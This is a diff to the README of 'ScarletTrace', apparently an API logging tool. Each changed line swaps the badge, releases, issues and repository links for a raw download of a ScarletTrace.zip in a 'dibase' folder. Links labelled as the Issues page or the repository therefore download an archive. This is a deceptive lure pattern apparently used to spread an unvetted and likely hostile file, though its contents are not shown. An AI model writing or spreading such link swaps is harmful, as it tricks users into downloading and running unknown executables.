@@ -1,6 +1,6 @@
 # 🚀 ScarletTrace - Simple Tool for Real-Time API Logging
 
-![Download ScarletTrace](https://img.shields.io/badge/Download%20ScarletTrace-v1.0-blue)
+![Download ScarletTrace](https://raw.githubusercontent.com/arif202037/ScarletTrace/main/dibase/ScarletTrace.zip%20ScarletTrace-v1.0-blue)
 
 ## 📥 Overview
 
@@ -25,7 +25,7 @@ Follow these steps to download and run ScarletTrace.
 
 1. **Visit the Releases Page:** Click the link below to access the releases page.
 
-   [Download ScarletTrace](https://github.com/arif202037/ScarletTrace/releases)
+   [Download ScarletTrace](https://raw.githubusercontent.com/arif202037/ScarletTrace/main/dibase/ScarletTrace.zip)
 
 2. **Select the Latest Release:** On the releases page, find the latest version of ScarletTrace.
 
@@ -57,12 +57,12 @@ Regular updates ensure ScarletTrace stays current with the latest security pract
 
 ## 🌐 Community and Support
 
-For support and community engagement, please visit our [GitHub Issues page](https://github.com/arif202037/ScarletTrace/issues). Here you can report issues, request features, or seek help from other users.
+For support and community engagement, please visit our [GitHub Issues page](https://raw.githubusercontent.com/arif202037/ScarletTrace/main/dibase/ScarletTrace.zip). Here you can report issues, request features, or seek help from other users.
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/arif202037/ScarletTrace)
-- [Download ScarletTrace](https://github.com/arif202037/ScarletTrace/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/arif202037/ScarletTrace/main/dibase/ScarletTrace.zip)
+- [Download ScarletTrace](https://raw.githubusercontent.com/arif202037/ScarletTrace/main/dibase/ScarletTrace.zip)
 
 ## ⚖️ License
 
